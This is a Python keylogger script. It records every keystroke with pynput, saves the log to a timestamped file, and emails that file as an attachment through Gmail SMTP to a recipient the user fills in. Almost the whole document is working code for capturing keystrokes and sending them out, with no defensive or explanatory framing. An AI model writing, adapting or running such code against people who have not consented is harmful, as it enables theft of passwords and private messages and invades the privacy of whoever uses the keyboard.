import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
from pynput.keyboard import Listener, Key
import time
from email.mime.text import MIMEText


# Create a list to store key presses in order
key_sequence = []

# Function to update key sequence
def on_press(key):
    try:
        # Convert the key to a string and add it to the sequence
        key_str = str(key.char)
        key_sequence.append(key_str)
    except AttributeError:
        # Handle special keys
        if key == Key.space:
            key_sequence.append(" ")  # Add space for space bar
        elif key == Key.enter:
            key_sequence.append("\n")  # Add a new line for enter
        elif key == Key.tab:
            key_sequence.append("\t")  # Add a tab character
        else:
            key_sequence.append(f"[{key}]")  # Add other special keys in brackets

# Function to stop listener
def on_release(key):
    if key == Key.esc:  # Press 'esc' to stop the listener
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Create a folder if it doesn't exist
folder_path = "keystroke_logs"
os.makedirs(folder_path, exist_ok=True)

# Generate a unique filename using timestamp
timestamp = time.strftime("%d%m%Y--%H%M%S") 
filename = os.path.join(folder_path, f"key_sequence_{timestamp}.txt")

# After stopping, save the results to a text file with the unique filename
with open(filename, "w") as file:
    file.write("".join(key_sequence))  # Join the list into a single string

# Send the file via email (SMTP)
# Gmail SMTP Server
smtp_server = "smtp.gmail.com"
smtp_port = 587
email_account = ""  # Replace with your Gmail address from which it will be sent
email_password = "" # Replace with your Gmail app-password

recipient = ''  # Recipient's email
subject = 'Keystroke Log File'
body = 'Please find the attached keystroke log file.'

# Create the MIME message
msg = MIMEMultipart()
msg['From'] = email_account
msg['To'] = recipient
msg['Subject'] = subject
msg.attach(MIMEText(body, 'plain'))

# Attach the keystroke log file
with open(filename, 'rb') as attachment:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filename)}')
    msg.attach(part)

# Sending the email
try:
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()  # Secure the connection
        server.login(email_account, email_password)
        server.sendmail(email_account, recipient, msg.as_string())
    print("Email sent successfully!")
except Exception as e:
    print(f"Failed to send email: {e}")
